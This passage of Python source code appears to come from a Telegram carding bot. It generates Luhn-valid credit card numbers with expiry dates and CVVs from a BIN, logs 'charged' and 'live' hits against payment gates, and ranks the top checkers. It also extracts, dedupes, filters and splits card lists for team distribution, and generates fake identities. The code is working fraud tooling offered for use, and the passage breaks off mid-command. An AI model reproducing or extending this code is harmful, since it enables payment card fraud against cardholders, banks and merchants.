    if len(args) < 2:
        await message.reply("""<b>𝙲𝙲 𝙶𝙴𝙽𝙴𝚁𝙰𝚃𝙾𝚁</b>

<b>Usage:</b> <code>/gen BIN</code> or <code>/gen BIN|MM|YY</code> or <code>/gen BIN|MM|YY|CVV</code>

<b>Examples:</b>
<code>/gen 411103</code> - 6 digit BIN
<code>/gen 41110312</code> - 8 digit BIN
<code>/gen 411103|05|2028</code> - with month/year
<code>/gen 411103|05|28|123</code> - with fixed CVV

Use 'rnd' for random values""")
        return

    # Parse input: BIN or BIN|MM|YY or BIN|MM|YY|CVV
    parts = args[1].replace('x', '').replace('X', '').split('|')
    bin_input = re.sub(r'\D', '', parts[0])

    if len(bin_input) < 6:
        await message.reply("BIN must be at least 6 digits")
        return

    # Month handling
    fixed_month = None
    if len(parts) >= 2 and parts[1].strip().lower() not in ('rnd', ''):
        try:
            month = int(parts[1])
            if 1 <= month <= 12:
                fixed_month = month
            else:
                month = random.randint(1, 12)
        except:
            month = random.randint(1, 12)
    else:
        month = random.randint(1, 12)

    # Year handling
    fixed_year = None
    if len(parts) >= 3 and parts[2].strip().lower() not in ('rnd', ''):
        try:
            year = int(parts[2])
            if year < 100:
                year += 2000
            fixed_year = year
        except:
            year = random.randint(2025, 2030)
    else:
        year = random.randint(2025, 2030)

    # CVV handling
    fixed_cvv = None
    if len(parts) >= 4 and parts[3].strip().lower() not in ('rnd', ''):
        cvv_input = re.sub(r'\D', '', parts[3])
        if len(cvv_input) >= 3:
            fixed_cvv = cvv_input[:4]  # 3 or 4 digit CVV

    # Generate 10 CCs with valid Luhn
    cards = []
    bin_prefix = bin_input[:15]  # Max 15 digits for prefix (leave room for check digit)

    for _ in range(10):
        # Fill to 15 digits (leaving room for check digit)
        remaining = 15 - len(bin_prefix)
        if remaining > 0:
            suffix = ''.join([str(random.randint(0, 9)) for _ in range(remaining)])
            card_base = bin_prefix + suffix
        else:
            card_base = bin_prefix[:15]

        # Calculate Luhn check digit
        digits = [int(d) for d in card_base]
        for i in range(len(digits) - 1, -1, -2):
            digits[i] *= 2
            if digits[i] > 9:
                digits[i] -= 9
        check_digit = (10 - (sum(digits) % 10)) % 10
        card_num = card_base + str(check_digit)

        # Use fixed or random month/year/cvv
        card_month = fixed_month if fixed_month else random.randint(1, 12)
        card_year = fixed_year if fixed_year else random.randint(2025, 2030)
        cvv = fixed_cvv if fixed_cvv else str(random.randint(100, 999))
        cards.append(f"{card_num}|{card_month:02d}|{card_year}|{cvv}")

    # Lookup BIN info
    bin_info = await lookup_bin(bin_input[:6])

    tier = db.get_user_tier(user.id, user.username)
    tier_display = tier.capitalize()

    cards_text = '\n'.join([f"<code>{c}</code>" for c in cards])

    # Build display format based on what user provided
    display_bin = bin_input + "x" * max(0, 16 - len(bin_input))
    display_parts = [display_bin]
    display_parts.append(f"{fixed_month:02d}" if fixed_month else "rnd")
    display_parts.append(str(fixed_year) if fixed_year else "rnd")
    display_parts.append(fixed_cvv if fixed_cvv else "rnd")
    display_format = "|".join(display_parts)

    # Store params for regen: bin_mm_yy_cvv (use 0 for random)
    stored_bin = bin_input[:10]
    mm_val = fixed_month if fixed_month else 0
    yy_val = fixed_year if fixed_year else 0
    cvv_val = fixed_cvv if fixed_cvv else "0"

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="𝚁𝚎-𝙶𝚎𝚗 🔄", callback_data=f"regen_{stored_bin}_{mm_val}_{yy_val}_{cvv_val}"),
         InlineKeyboardButton(text="𝙴𝚡𝚒𝚝 ⚠️", callback_data="close_menu")]
    ])

    response = f"""<b>Bin</b> - <code>{display_format}</code>
- - - - - - - - - - - - - - - - - - - - -
{cards_text}
- - - - - - - - - - - - - - - - - - - - -
<b>Info</b> - {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
<b>Bank</b> - {bin_info['bank'][:30]}
<b>Country</b> - {bin_info['emoji']} {bin_info['country']}
- - - - - - - - - - - - - - - - - - - - -
<b>Used By</b> - <a href="tg://resolve?domain={user.username or BOT_USERNAME}">{user.first_name}</a> [{tier_display}]"""

    await message.reply(response, reply_markup=keyboard, disable_web_page_preview=True)

async def cmd_me(message: Message):
    user = message.from_user
    stats = db.get_user_stats(user.id)

    if not stats:
        stats = {'total_checks': 0, 'live_hits': 0, 'dead_hits': 0, 'role': 'user', 'credits': 100}

    total = stats['total_checks']
    live = stats['live_hits']
    rate = (live / total * 100) if total > 0 else 0

    # Determine tier
    if is_owner(user):
        tier = "OWNER"
    elif db.is_premium(user.id):
        tier = "PREMIUM"
    else:
        tier = "USER"

    response = f"""{MINI_BANNER}

<b>━━━ PROFILE ━━━</b>

<b>👤 User:</b> @{user.username or user.first_name} [{tier}]
<b>🆔 ID:</b> <code>{user.id}</code>

<b>━━━ STATISTICS ━━━</b>
<b>📊 Total Checks:</b> {total}
<b>🔥 Charged:</b> {live}
<b>❌ Dead:</b> {total - live}
<b>📈 Success Rate:</b> {rate:.1f}%"""

    await message.reply(response)

@dp.message(Command("top", "leaderboard"))
async def cmd_top(message: Message):
    leaders = db.get_leaderboard(10)

    if not leaders:
        await message.reply("❌ No data yet")
        return

    txt = f"""{MINI_BANNER}

<b>━━━ TOP CHECKERS ━━━</b>

"""
    medals = ['🥇', '🥈', '🥉'] + ['🏅'] * 7

    for i, (username, live, total) in enumerate(leaders):
        rate = (live / total * 100) if total > 0 else 0
        txt += f"{medals[i]} <b>@{username or 'User'}</b> - {live} hits ({rate:.0f}%)\n"

    await message.reply(txt)

@dp.message(Command("last", "history"))
async def cmd_last(message: Message):
    user = message.from_user
    history = db.get_user_history(user.id, 5)

    if not history:
        await message.reply("❌ No check history")
        return

    txt = f"""{MINI_BANNER}

<b>━━━ RECENT CHECKS ━━━</b>

"""
    for card_bin, card_last4, gate, status, check_time, timestamp in history:
        emoji = get_status_emoji(status, None)
        txt += f"{emoji} <code>{card_bin}xx{card_last4}</code> | {status} | {check_time:.1f}s\n"

    await message.reply(txt)

@dp.message(Command("stats"))
async def cmd_stats(message: Message):
    user = message.from_user
    if not is_owner(user):
        await message.reply("❌ Owner only command")
        return

    total_users = db.get_total_users()
    total_gates = db.get_gateway_count()
    checks_today = db.get_total_checks_today()
    live_today = db.get_live_today()

    response = f"""{MINI_BANNER}

<b>━━━ BOT STATISTICS ━━━</b>

<b>👥 Total Users:</b> {total_users}
<b>⚡ Active Gates:</b> {total_gates}
<b>📊 Checks Today:</b> {checks_today}
<b>🔥 Charged Today:</b> {live_today}
<b>📈 Hit Rate:</b> {(live_today/checks_today*100) if checks_today > 0 else 0:.1f}%

<b>Bot:</b> @{BOT_USERNAME}"""

    await message.reply(response)

@dp.message(Command("ban"))
async def cmd_ban(message: Message):
    user = message.from_user
    if not is_owner(user):
        await message.reply("❌ Owner only command")
        return

    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.reply("<b>Usage:</b> <code>/ban USER_ID</code>")
        return

    try:
        target_id = int(args[1].strip())
        db.ban_user(target_id, user.id)
        await message.reply(f"✅ User {target_id} has been banned")
    except:
        await message.reply("❌ Invalid user ID")

@dp.message(Command("unban"))
async def cmd_unban(message: Message):
    user = message.from_user
    if not is_owner(user):
        await message.reply("❌ Owner only command")
        return

    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.reply("<b>Usage:</b> <code>/unban USER_ID</code>")
        return

    try:
        target_id = int(args[1].strip())
        db.unban_user(target_id)
        await message.reply(f"✅ User {target_id} has been unbanned")
    except:
        await message.reply("❌ Invalid user ID")

@dp.message(Command("broadcast"))
async def cmd_broadcast(message: Message):
    user = message.from_user
    if not is_owner(user):
        await message.reply("❌ Owner only command")
        return

    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.reply("<b>Usage:</b> <code>/broadcast Your message here</code>")
        return

    await message.reply("📢 Broadcast feature coming soon!")

# ═══════════════════════════════════════════════════════════════
#                    PREMIUM KEY COMMANDS
# ═══════════════════════════════════════════════════════════════

@dp.message(Command("genkey", "genkeys"))
async def cmd_genkey(message: Message):
    """Generate premium keys (Owner only)"""
    user = message.from_user
    if not is_owner(user):
        await message.reply("❌ Owner only command")
        return

    args = message.text.split()
    # /genkey [days] [count]
    days = 30
    count = 1

    if len(args) >= 2:
        try:
            days = int(args[1])
        except:
            pass
    if len(args) >= 3:
        try:
            count = min(int(args[2]), 10)  # Max 10 keys at once
        except:
            pass

    keys = []
    for _ in range(count):
        key = db.generate_key(days, user.id)
        keys.append(key)

    txt = f"""{MINI_BANNER}

<b>━━━ GENERATED KEYS ━━━</b>

<b>Duration:</b> {days} days
<b>Count:</b> {count}

"""
    for k in keys:
        txt += f"<code>{k}</code>\n"

    txt += f"\n<i>Users can redeem with /redeem KEY</i>"
    await message.reply(txt)

@dp.message(Command("redeem"))
async def cmd_redeem(message: Message):
    """Redeem a premium key"""
    user = message.from_user
    db.get_or_create_user(user.id, user.username, user.first_name)

    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.reply(f"{MINI_BANNER}\n\n<b>Usage:</b> <code>/redeem PROO-XXXX-XXXX-XXXX</code>")
        return

    key_code = args[1].strip().upper()
    success, result = db.redeem_key(key_code, user.id)

    if success:
        await message.reply(f"""{MINI_BANNER}

✅ <b>Key Redeemed Successfully!</b>

<b>Premium expires:</b> {result}
<b>Features unlocked:</b>
• Mass check: 10 cards
• Mass txt: 100 cards""")
    else:
        await message.reply(f"❌ {result}")

@dp.message(Command("keys"))
async def cmd_keys(message: Message):
    """View all generated keys (Owner only)"""
    user = message.from_user
    if not is_owner(user):
        await message.reply("❌ Owner only command")
        return

    keys = db.get_all_keys(20)
    if not keys:
        await message.reply("❌ No keys generated yet")
        return

    txt = f"""{MINI_BANNER}

<b>━━━ ALL KEYS ━━━</b>

"""
    for key, days, used, redeemed_by, created in keys:
        status = "🔴 Used" if used else "🟢 Available"
        txt += f"<code>{key}</code>\n{status} | {days}d\n\n"

    await message.reply(txt)

# ═══════════════════════════════════════════════════════════════
#                    MASS CHECK COMMANDS
# ═══════════════════════════════════════════════════════════════

def get_tier_limits(tier: str) -> dict:
    """Get limits based on user tier"""
    if tier == 'owner':
        return {'mchk': 99999, 'mtxt': 99999}  # No limit for owner
    elif tier == 'premium':
        return {'mchk': 10, 'mtxt': 100}
    else:  # free
        return {'mchk': 5, 'mtxt': 30}

async def cmd_split(message: Message):
    """Split CC list into multiple parts - as messages or txt files"""
    user = message.from_user
    text_to_parse = ""
    send_as_txt = False
    num_parts = 0

    # Parse command args: /split [txt] <num_parts>
    parts = message.text.split()

    if len(parts) < 2:
        await message.reply(f"""{MINI_BANNER}

<b>━━━ CC SPLITTER ━━━</b>

<b>Usage:</b>
• <code>/split 5</code> - Split into 5 messages
• <code>/split txt 5</code> - Split into 5 .txt files

Reply to a message or .txt file containing CCs.

<b>Examples:</b>
• Reply to CC list → <code>/split 3</code> (3 messages)
• Reply to .txt file → <code>/split txt 10</code> (10 files)""")
        return

    # Check if "txt" mode
    if parts[1].lower() == 'txt':
        send_as_txt = True
        if len(parts) >= 3 and parts[2].isdigit():
            num_parts = int(parts[2])
        else:
            await message.reply("❌ Specify number of parts: <code>/split txt 5</code>")
            return
    elif parts[1].isdigit():
        num_parts = int(parts[1])
    else:
        await message.reply("❌ Invalid format. Use: <code>/split 5</code> or <code>/split txt 5</code>")
        return

    if num_parts < 2:
        await message.reply("❌ Number of parts must be at least 2")
        return

    # Get text from replied message
    if message.reply_to_message:
        if message.reply_to_message.document:
            doc = message.reply_to_message.document
            if doc.file_name and doc.file_name.endswith('.txt'):
                try:
                    file = await message.bot.download(doc)
                    text_to_parse = file.read().decode('utf-8', errors='ignore')
                except Exception as e:
                    await message.reply(f"❌ Failed to read file: {str(e)[:50]}")
                    return
            else:
                await message.reply("❌ Please reply to a .txt file or text message")
                return
        elif message.reply_to_message.text:
            text_to_parse = message.reply_to_message.text
        elif message.reply_to_message.caption:
            text_to_parse = message.reply_to_message.caption
    else:
        await message.reply("❌ Reply to a message or .txt file containing CCs")
        return

    if not text_to_parse:
        await message.reply("❌ No text found to split")
        return

    # Extract cards
    cards = extract_cards_from_text(text_to_parse)

    if not cards:
        await message.reply("❌ No valid cards found in format CC|MM|YY|CVV")
        return

    if len(cards) < num_parts:
        await message.reply(f"❌ Only {len(cards)} cards found, can't split into {num_parts} parts")
        return

    # Calculate cards per part
    cards_per_part = len(cards) // num_parts
    remainder = len(cards) % num_parts

    # Split cards into parts
    split_parts = []
    start_idx = 0
    for i in range(num_parts):
        # Distribute remainder across first few parts
        end_idx = start_idx + cards_per_part + (1 if i < remainder else 0)
        split_parts.append(cards[start_idx:end_idx])
        start_idx = end_idx

    # Send status
    await message.reply(f"✅ Splitting {len(cards)} cards into {num_parts} parts...")

    if send_as_txt:
        # Send as .txt files
        from io import BytesIO
        for i, part_cards in enumerate(split_parts, 1):
            content = ""
            for card in part_cards:
                card_display = format_card_display(card['number'], card['month'], card['year'], card['cvv'])
                content += f"{card_display}\n"

            # Create file
            file_bytes = BytesIO(content.encode('utf-8'))
            file_bytes.name = f"part_{i}_of_{num_parts}.txt"

            from aiogram.types import BufferedInputFile
            input_file = BufferedInputFile(file_bytes.getvalue(), filename=f"part_{i}_of_{num_parts}.txt")

            await message.answer_document(
                input_file,
                caption=f"📄 <b>Part {i}/{num_parts}</b>\n{len(part_cards)} cards"
            )
            await asyncio.sleep(0.3)  # Small delay to avoid flood

        await message.answer(f"✅ <b>Split complete!</b>\n\n• Total: {len(cards)} cards\n• Parts: {num_parts}\n• By: @{user.username or user.first_name}")

    else:
        # Send as messages
        for i, part_cards in enumerate(split_parts, 1):
            response = f"<b>📄 Part {i}/{num_parts}</b> ({len(part_cards)} cards)\n\n"

            cards_text = ""
            for card in part_cards:
                card_display = format_card_display(card['number'], card['month'], card['year'], card['cvv'])
                cards_text += f"<code>{card_display}</code>\n"

            # Check if fits in one message
            if len(response + cards_text) <= TELEGRAM_MSG_LIMIT:
                await message.answer(response + cards_text)
            else:
                # Split this part into sub-messages
                await message.answer(response.strip())
                card_lines = cards_text.strip().split('\n')
                current_chunk = ""
                sub_num = 1

                for line in card_lines:
                    test_chunk = current_chunk + line + "\n"
                    if len(test_chunk) > TELEGRAM_MSG_LIMIT - 50:
                        if current_chunk:
                            await message.answer(current_chunk.strip())
                            sub_num += 1
                        current_chunk = line + "\n"
                    else:
                        current_chunk = test_chunk

                if current_chunk.strip():
                    await message.answer(current_chunk.strip())

            await asyncio.sleep(0.3)  # Small delay

        await message.answer(f"✅ <b>Split complete!</b>\n\n• Total: {len(cards)} cards\n• Parts: {num_parts}\n• By: @{user.username or user.first_name}")

@dp.message(Command("clean", "extract"))
async def cmd_clean(message: Message):
    """Extract CC|MM|YY|CVV cards from text, replied message, or .txt file"""
    user = message.from_user
    text_to_parse = ""

    # Get text from args or replied message
    parts = message.text.split(maxsplit=1)
    if len(parts) > 1:
        text_to_parse = parts[1]
    elif message.reply_to_message:
        # Check if it's a .txt file
        if message.reply_to_message.document:
            doc = message.reply_to_message.document
            if doc.file_name and doc.file_name.endswith('.txt'):
                try:
                    file = await message.bot.download(doc)
                    text_to_parse = file.read().decode('utf-8', errors='ignore')
                except Exception as e:
                    await message.reply(f"❌ Failed to read file: {str(e)[:50]}")
                    return
            else:
                await message.reply("❌ Please reply to a .txt file or text message")
                return
        elif message.reply_to_message.text:
            text_to_parse = message.reply_to_message.text
        elif message.reply_to_message.caption:
            text_to_parse = message.reply_to_message.caption

    if not text_to_parse:
        await message.reply(f"""{MINI_BANNER}

<b>━━━ CC EXTRACTOR ━━━</b>

<b>Usage:</b>
• <code>/clean TEXT_WITH_CCS</code>
• Reply to any message with <code>/clean</code>
• Reply to a .txt file with <code>/clean</code>

Extracts all CC|MM|YY|CVV format cards.""")
        return

    # Extract cards
    cards = extract_cards_from_text(text_to_parse)

    if not cards:
        await message.reply("❌ No valid cards found in format CC|MM|YY|CVV")
        return

    # Build header
    header = f"""{MINI_BANNER}

<b>━━━ EXTRACTED CARDS ━━━</b>

<b>Found:</b> {len(cards)} valid cards

"""

    # Build cards text
    cards_text = ""
    for card in cards:
        card_display = format_card_display(card['number'], card['month'], card['year'], card['cvv'])
        cards_text += f"<code>{card_display}</code>\n"

    footer = f"\n<b>User:</b> @{user.username or user.first_name}"

    full_response = header + cards_text + footer

    # Check if fits in one message
    if len(full_response) <= TELEGRAM_MSG_LIMIT:
        await message.reply(full_response)
    else:
        # Split into multiple messages
        await message.reply(header.strip())

        # Split cards into chunks
        card_lines = cards_text.strip().split('\n')
        current_chunk = ""
        chunk_num = 1

        for line in card_lines:
            test_chunk = current_chunk + line + "\n"
            if len(test_chunk) > TELEGRAM_MSG_LIMIT - 100:
                if current_chunk:
                    await message.answer(f"<b>📄 Part {chunk_num}:</b>\n\n{current_chunk.strip()}")
                    chunk_num += 1
                current_chunk = line + "\n"
            else:
                current_chunk = test_chunk

        # Send remaining
        if current_chunk.strip():
            await message.answer(f"<b>📄 Part {chunk_num}:</b>\n\n{current_chunk.strip()}")

        # Summary
        await message.answer(f"<b>✅ Total: {len(cards)} cards extracted in {chunk_num} parts</b>\n{footer}")

# ═══════════════════════════════════════════════════════════════
#                    POTATOES SMART COMMANDS
# ═══════════════════════════════════════════════════════════════

@dp.message(Command("dupe", "dedup", "unique"))
async def cmd_dedupe(message: Message):
    """Remove duplicate cards from a list"""
    user = message.from_user
    text_to_parse = ""

    parts = message.text.split(maxsplit=1)
    if len(parts) > 1:
        text_to_parse = parts[1]
    elif message.reply_to_message:
        text_to_parse = message.reply_to_message.text or message.reply_to_message.caption or ""

    if not text_to_parse:
        await message.reply(f"""<b>🔄 DEDUPE</b>

<b>Usage:</b>
• <code>/dupe CC|MM|YY|CVV (multiple lines)</code>
• Reply to message with <code>/dupe</code>

Removes duplicate cards, keeps unique ones.""")
        return

    cards = extract_cards_from_text(text_to_parse)
    if not cards:
        await message.reply("❌ No valid cards found")
        return

    # Dedupe by card number
    seen = set()
    unique_cards = []
    for card in cards:
        if card['number'] not in seen:
            seen.add(card['number'])
            unique_cards.append(card)

    removed = len(cards) - len(unique_cards)

    response = f"""<b>🔄 DEDUPE RESULTS</b>

<b>Original:</b> {len(cards)}
<b>Unique:</b> {len(unique_cards)}
<b>Removed:</b> {removed} duplicates

"""
    for card in unique_cards[:100]:
        response += f"<code>{format_card_display(card['number'], card['month'], card['year'], card['cvv'])}</code>\n"

    if len(unique_cards) > 100:
        response += f"\n<i>...and {len(unique_cards) - 100} more</i>"

    await message.reply(response)

@dp.message(Command("filter", "fbin"))
async def cmd_filter(message: Message):
    """Filter cards by BIN prefix"""
    user = message.from_user

    args = message.text.split(maxsplit=2)
    text_to_parse = ""
    filter_bin = ""

    if len(args) >= 2:
        filter_bin = args[1].strip()
        if len(args) >= 3:
            text_to_parse = args[2]

    if message.reply_to_message and not text_to_parse:
        text_to_parse = message.reply_to_message.text or message.reply_to_message.caption or ""

    if not filter_bin:
        await message.reply(f"""<b>🔍 FILTER BY BIN</b>

<b>Usage:</b>
• <code>/filter 424242 CC|MM|YY|CVV...</code>
• Reply to cards with <code>/filter 424242</code>

Filter cards by BIN prefix (4-8 digits).""")
        return

    if not text_to_parse:
        await message.reply("❌ No cards provided. Reply to a message or paste cards after BIN.")
        return

    cards = extract_cards_from_text(text_to_parse)
    if not cards:
        await message.reply("❌ No valid cards found")
        return

    # Filter by BIN
    filtered = [c for c in cards if c['number'].startswith(filter_bin)]

    if not filtered:
        await message.reply(f"❌ No cards found with BIN <code>{filter_bin}</code>")
        return

    response = f"""<b>🔍 FILTER RESULTS</b>

<b>BIN:</b> <code>{filter_bin}</code>
<b>Found:</b> {len(filtered)}/{len(cards)}

"""
    for card in filtered[:100]:
        response += f"<code>{format_card_display(card['number'], card['month'], card['year'], card['cvv'])}</code>\n"

    if len(filtered) > 100:
        response += f"\n<i>...and {len(filtered) - 100} more</i>"

    await message.reply(response)

@dp.message(Command("split", "chunk"))
async def cmd_split(message: Message):
    """Split cards into chunks for team distribution"""
    user = message.from_user

    args = message.text.split(maxsplit=2)
    chunk_size = 10
    text_to_parse = ""

    if len(args) >= 2 and args[1].isdigit():
        chunk_size = min(int(args[1]), 100)
        if len(args) >= 3:
            text_to_parse = args[2]
    elif len(args) >= 2:
        text_to_parse = " ".join(args[1:])

    if message.reply_to_message and not text_to_parse:
        text_to_parse = message.reply_to_message.text or message.reply_to_message.caption or ""

    if not text_to_parse:
        await message.reply(f"""<b>✂️ SPLIT CARDS</b>

<b>Usage:</b>
• <code>/split 20 CC|MM|YY|CVV...</code>
• Reply to cards with <code>/split 20</code>

Splits cards into chunks for team distribution.""")
        return

    cards = extract_cards_from_text(text_to_parse)
    if not cards:
        await message.reply("❌ No valid cards found")
        return

    # Split into chunks
    chunks = [cards[i:i + chunk_size] for i in range(0, len(cards), chunk_size)]

    await message.reply(f"""<b>✂️ SPLIT RESULTS</b>

<b>Total:</b> {len(cards)} cards
<b>Chunk Size:</b> {chunk_size}
<b>Chunks:</b> {len(chunks)}

Sending {len(chunks)} messages...""")

    for i, chunk in enumerate(chunks[:20]):  # Max 20 chunks
        chunk_text = f"<b>Chunk {i+1}/{len(chunks)}</b>\n\n"
        for card in chunk:
            chunk_text += f"<code>{format_card_display(card['number'], card['month'], card['year'], card['cvv'])}</code>\n"
        await message.reply(chunk_text)
        await asyncio.sleep(0.3)

    if len(chunks) > 20:
        await message.reply(f"<i>Showing first 20 chunks. {len(chunks) - 20} more chunks not shown.</i>")

@dp.message(Command("fake", "fakeinfo"))
async def cmd_fake(message: Message):
    """Generate fake identity for testing"""
    user = message.from_user

    args = message.text.split(maxsplit=1)
    country_code = "US"
    if len(args) >= 2:
        country_code = args[1].upper()[:2]

    # Generate fake info based on country
    fake_data = generate_fake_identity(country_code)

    response = f"""<b>🎭 FAKE IDENTITY</b>

<b>━━━ Personal ━━━</b>
👤 <b>Name:</b> <code>{fake_data['first_name']} {fake_data['last_name']}</code>
📧 <b>Email:</b> <code>{fake_data['email']}</code>
📱 <b>Phone:</b> <code>{fake_data['phone']}</code>

<b>━━━ Address ━━━</b>
🏠 <b>Street:</b> <code>{fake_data['address']}</code>
🏙️ <b>City:</b> <code>{fake_data['city']}</code>
🗺️ <b>State:</b> <code>{fake_data['state']}</code>
📮 <b>ZIP:</b> <code>{fake_data['zip']}</code>
🌍 <b>Country:</b> <code>{fake_data['country']}</code>

<i>Regenerate: /fake {country_code}</i>"""

    await message.reply(response)

def generate_fake_identity(country_code: str = "US") -> dict:
    """Generate fake identity data"""
    import random
    import string

    first_names = ["James", "John", "Michael", "David", "Robert", "William", "Richard", "Joseph",
                   "Mary", "Patricia", "Jennifer", "Linda", "Elizabeth", "Susan", "Jessica", "Sarah"]
    last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis",
                  "Rodriguez", "Martinez", "Anderson", "Taylor", "Thomas", "Moore", "Jackson", "Martin"]

    us_states = {"AL": "Alabama", "AK": "Alaska", "AZ": "Arizona", "CA": "California", "CO": "Colorado",
                 "FL": "Florida", "GA": "Georgia", "IL": "Illinois", "NY": "New York", "TX": "Texas",
                 "WA": "Washington", "PA": "Pennsylvania", "OH": "Ohio", "MI": "Michigan", "NC": "North Carolina"}

    us_cities = {"CA": ["Los Angeles", "San Francisco", "San Diego"], "NY": ["New York", "Buffalo", "Albany"],
                 "TX": ["Houston", "Dallas", "Austin"], "FL": ["Miami", "Orlando", "Tampa"],
                 "IL": ["Chicago", "Springfield"], "WA": ["Seattle", "Tacoma"]}

    street_names = ["Main St", "Oak Ave", "Maple Dr", "Cedar Ln", "Pine Rd", "Elm St", "Park Ave",
                    "Lake Dr", "Hill Rd", "River Rd", "Forest Ave", "Valley Dr"]

    first = random.choice(first_names)
    last = random.choice(last_names)

    if country_code == "US":
        state_code = random.choice(list(us_states.keys()))
        state = us_states[state_code]
        city = random.choice(us_cities.get(state_code, ["Springfield"]))
        zip_code = f"{random.randint(10000, 99999)}"
        phone = f"+1{random.randint(200, 999)}{random.randint(200, 999)}{random.randint(1000, 9999)}"
        country = "United States"
    elif country_code == "UK" or country_code == "GB":
        state = random.choice(["London", "Manchester", "Birmingham", "Liverpool", "Leeds"])
        city = state
        zip_code = f"{random.choice(['SW', 'NW', 'SE', 'E', 'W'])}{random.randint(1, 20)} {random.randint(1, 9)}{random.choice(string.ascii_uppercase)}{random.choice(string.ascii_uppercase)}"
        phone = f"+44{random.randint(7000, 7999)}{random.randint(100000, 999999)}"
        country = "United Kingdom"
        state_code = "UK"
    elif country_code == "CA":
        provinces = {"ON": "Ontario", "BC": "British Columbia", "AB": "Alberta", "QC": "Quebec"}
        state_code = random.choice(list(provinces.keys()))
        state = provinces[state_code]
        city = random.choice(["Toronto", "Vancouver", "Montreal", "Calgary", "Ottawa"])
        zip_code = f"{random.choice(string.ascii_uppercase)}{random.randint(1,9)}{random.choice(string.ascii_uppercase)} {random.randint(1,9)}{random.choice(string.ascii_uppercase)}{random.randint(1,9)}"
        phone = f"+1{random.randint(200, 999)}{random.randint(200, 999)}{random.randint(1000, 9999)}"
        country = "Canada"
    else:
        state = "State"
        state_code = country_code
        city = "City"
        zip_code = f"{random.randint(10000, 99999)}"
        phone = f"+{random.randint(1, 99)}{random.randint(1000000000, 9999999999)}"
        country = country_code

    email_domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "icloud.com"]
    email = f"{first.lower()}.{last.lower()}{random.randint(1, 99)}@{random.choice(email_domains)}"

    return {
        'first_name': first,
        'last_name': last,
        'email': email,
        'phone': phone,
        'address': f"{random.randint(100, 9999)} {random.choice(street_names)}",
        'city': city,
        'state': f"{state} ({state_code})",
        'zip': zip_code,
        'country': country
    }

@dp.message(Command("live", "hits", "livehits"))
async def cmd_live(message: Message):
    """Show recent live hits from the team"""
    user = message.from_user

    args = message.text.split(maxsplit=1)
    limit = 20
    if len(args) >= 2 and args[1].isdigit():
        limit = min(int(args[1]), 50)

    c = db.conn.cursor()
    c.execute('''SELECT ch.card_bin, ch.card_last4, ch.gateway, ch.status, ch.check_time, ch.timestamp, u.username
                 FROM check_history ch
                 LEFT JOIN users u ON ch.user_id = u.user_id
                 WHERE ch.status IN ('CHARGED', '3DS', '2FACTOR', 'Approved ⇾ CCN', 'Approved ⇾ AVS')
                    OR ch.status LIKE 'Approved%'
                 ORDER BY ch.timestamp DESC
                 LIMIT ?''', (limit,))
    hits = c.fetchall()

    if not hits:
        await message.reply("❌ No live hits found recently")
        return

    response = f"""<b>🔥 RECENT LIVE HITS</b>

<b>Showing:</b> {len(hits)} hits

"""
    for hit in hits:
        card_bin, last4, gateway, status, check_time, timestamp, username = hit
        username = username or "Unknown"
        status_emoji = "🔥" if "CHARGED" in status else "✅"
        response += f"{status_emoji} <code>{card_bin}****{last4}</code> | {status} | @{username}\n"

    response += f"\n<i>Use /live 50 for more results</i>"
    await message.reply(response)

@dp.message(Command("today", "stats24", "daily"))
async def cmd_today(message: Message):
    """Show today's team stats"""
    user = message.from_user

    c = db.conn.cursor()

    # Today's stats
    c.execute('''SELECT COUNT(*),
                        SUM(CASE WHEN status IN ('CHARGED', '3DS', '2FACTOR') OR status LIKE 'Approved%' THEN 1 ELSE 0 END),
                        SUM(CASE WHEN status = 'DECLINED' OR status = 'DEAD' THEN 1 ELSE 0 END)
                 FROM check_history
                 WHERE DATE(timestamp) = DATE('now')''')
    total, live, dead = c.fetchone()
    total = total or 0
    live = live or 0
    dead = dead or 0

    # Top checkers today
    c.execute('''SELECT u.username, COUNT(*) as checks,
                        SUM(CASE WHEN ch.status IN ('CHARGED', '3DS', '2FACTOR') OR ch.status LIKE 'Approved%' THEN 1 ELSE 0 END) as hits
                 FROM check_history ch
                 LEFT JOIN users u ON ch.user_id = u.user_id
                 WHERE DATE(ch.timestamp) = DATE('now')
                 GROUP BY ch.user_id
                 ORDER BY hits DESC
                 LIMIT 10''')
    top_checkers = c.fetchall()

    # Most used gates today
    c.execute('''SELECT gateway, COUNT(*) as uses,
                        SUM(CASE WHEN status IN ('CHARGED', '3DS', '2FACTOR') OR status LIKE 'Approved%' THEN 1 ELSE 0 END) as hits
                 FROM check_history
                 WHERE DATE(timestamp) = DATE('now')
                 GROUP BY gateway
                 ORDER BY hits DESC
                 LIMIT 5''')
    top_gates = c.fetchall()

    hit_rate = (live / total * 100) if total > 0 else 0

    response = f"""<b>📊 TODAY'S STATS</b>

<b>━━━ Overview ━━━</b>
📈 Total Checks: {total}
✅ Live Hits: {live}
❌ Dead: {dead}
📊 Hit Rate: {hit_rate:.1f}%

<b>━━━ Top Checkers ━━━</b>
"""
    for i, (username, checks, hits) in enumerate(top_checkers[:5], 1):
        medal = ["🥇", "🥈", "🥉", "4️⃣", "5️⃣"][i-1]
        username = username or "Unknown"
        response += f"{medal} @{username}: {hits} hits ({checks} checks)\n"

    response += "\n<b>━━━ Top Gates ━━━</b>\n"
    for gateway, uses, hits in top_gates[:5]:
        response += f"/{gateway}: {hits} hits ({uses} uses)\n"

    response += f"\n<i>Potatoes 🔥</i>"
    await message.reply(response)

@dp.message(Command("exp", "expdate", "byexp"))
async def cmd_exp(message: Message):
    """Filter cards by expiry date"""
    user = message.from_user

    args = message.text.split(maxsplit=2)
    exp_filter = ""
    text_to_parse = ""

    if len(args) >= 2:
        exp_filter = args[1].strip()
        if len(args) >= 3:
            text_to_parse = args[2]

    if message.reply_to_message and not text_to_parse:
        text_to_parse = message.reply_to_message.text or message.reply_to_message.caption or ""

    if not exp_filter or not text_to_parse:
        await message.reply(f"""<b>📅 FILTER BY EXPIRY</b>

<b>Usage:</b>
• <code>/exp 2025 CC|MM|YY|CVV...</code> - Filter by year
• <code>/exp 12/25 CC|MM|YY|CVV...</code> - Filter by MM/YY
